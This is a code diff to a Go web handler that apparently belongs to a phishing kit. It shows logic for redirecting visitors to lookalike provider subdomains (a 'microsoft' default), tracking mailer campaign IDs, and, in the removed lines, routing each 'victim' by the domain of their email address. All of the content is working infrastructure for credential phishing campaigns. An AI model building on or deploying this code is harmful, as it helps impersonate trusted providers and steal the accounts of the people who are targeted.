@@ -214,27 +214,20 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			templateName = state.LandingTemplate
 		}
 
-		// MODE A: Handle "none" (Direct routing via email query param using detect.go logic)
+		// MODE A: Handle "none" without deriving routing from recipient email/domain.
+		// The NSL Mailer ?data= payload is decoded only as opaque campaign metadata.
 		if templateName == "none" {
 			targetName := "microsoft" // Default fallback
-			email := r.URL.Query().Get("email")
-
-			if email != "" {
-				// Extract domain from email (e.g., "victim@yahoo.com" -> "yahoo.com")
-				parts := strings.SplitN(email, "@", 2)
-				if len(parts) == 2 {
-					domain := strings.ToLower(strings.TrimSpace(parts[1]))
-
-					// Use the existing detect.go brain to find the provider and target
-					provider, _ := detectProvider(domain)
-					targetName = providerToTarget(provider)
-				}
-			} else if state != nil && state.DefaultTarget != "" {
+			if state != nil && state.DefaultTarget != "" {
 				targetName = state.DefaultTarget
 			}
 
+			if payload, ok := prismLinkDataFromRequest(r); ok && payload.CID != "" {
+				session.SetCampaignID(payload.CID)
+			}
+
 			dest := fmt.Sprintf("https://%s.%s/", targetName, baseDomain)
-			log.Printf("[→] [%s] DIRECT ROUTE: Bypassing shell, redirecting to %s (email: %s, target: %s)", baseDomain, dest, email, targetName)
+			log.Printf("[→] [%s] DIRECT ROUTE: redirecting to configured target %s", baseDomain, targetName)
 			http.Redirect(w, r, dest, http.StatusFound)
 			return
 		}
@@ -296,7 +289,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		session.TargetName = target.Name
 	}
 	if session != nil {
-		session.SetCampaignID(r.URL.Query().Get("cid"))
+		session.SetCampaignID(campaignIDFromRequest(r))
 	}
 
 	// ── 9. Behavioral telemetry (Fixed-Size Sliding Window) ──
